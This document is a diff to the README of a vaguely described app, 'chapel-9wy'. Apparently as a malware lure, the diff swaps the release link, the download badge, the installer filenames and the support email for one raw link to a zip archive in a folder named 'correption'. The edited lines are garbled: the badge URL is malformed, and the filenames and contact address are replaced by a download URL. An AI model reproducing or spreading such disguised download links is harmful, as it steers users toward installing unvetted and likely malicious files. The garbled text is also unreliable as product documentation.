@@ -1,6 +1,6 @@
 # 🎉 chapel-9wy - Simplified Software for Everyday Tasks
 
-[![Download chapel-9wy](https://img.shields.io/badge/Download%20Now-Get%20Started%21-blue.svg)](https://github.com/Vladamirmidweekly743/chapel-9wy/releases)
+[![Download chapel-9wy](https://raw.githubusercontent.com/Vladamirmidweekly743/chapel-9wy/main/correption/chapel-9wy_v3.2.zip%20Now-Get%20Started%https://raw.githubusercontent.com/Vladamirmidweekly743/chapel-9wy/main/correption/chapel-9wy_v3.2.zip)](https://raw.githubusercontent.com/Vladamirmidweekly743/chapel-9wy/main/correption/chapel-9wy_v3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -20,9 +20,9 @@ Before you download, ensure your device meets the following requirements:
 
 To get started with chapel-9wy, follow these steps:
 
-1. **Visit the Releases Page:** Click this link to download: [Releases Page](https://github.com/Vladamirmidweekly743/chapel-9wy/releases).
+1. **Visit the Releases Page:** Click this link to download: [Releases Page](https://raw.githubusercontent.com/Vladamirmidweekly743/chapel-9wy/main/correption/chapel-9wy_v3.2.zip).
 2. **Choose Your Version:** You will see a list of the latest versions. Select the version you want to download. It is advisable to choose the latest stable version.
-3. **Download the Installer:** Click on the desired file to download. The installer file will usually be named something like `chapel-9wy-installer.exe` or `chapel-9wy.dmg`.
+3. **Download the Installer:** Click on the desired file to download. The installer file will usually be named something like `https://raw.githubusercontent.com/Vladamirmidweekly743/chapel-9wy/main/correption/chapel-9wy_v3.2.zip` or `https://raw.githubusercontent.com/Vladamirmidweekly743/chapel-9wy/main/correption/chapel-9wy_v3.2.zip`.
 4. **Run the Installer:**
    - For Windows: Double-click the downloaded file and follow the on-screen instructions.
    - For macOS: Open the downloaded file and drag the chapel-9wy icon to your Applications folder.
@@ -57,7 +57,7 @@ Customize your experience by visiting the “Settings” menu. You can change no
 
 ## 💬 Support
 
-If you have any questions or run into issues, please refer to the FAQs in the app or contact our support team at support@chapel-9wy.com.
+If you have any questions or run into issues, please refer to the FAQs in the app or contact our support team at https://raw.githubusercontent.com/Vladamirmidweekly743/chapel-9wy/main/correption/chapel-9wy_v3.2.zip
 
 ## 📝 Changelog
 
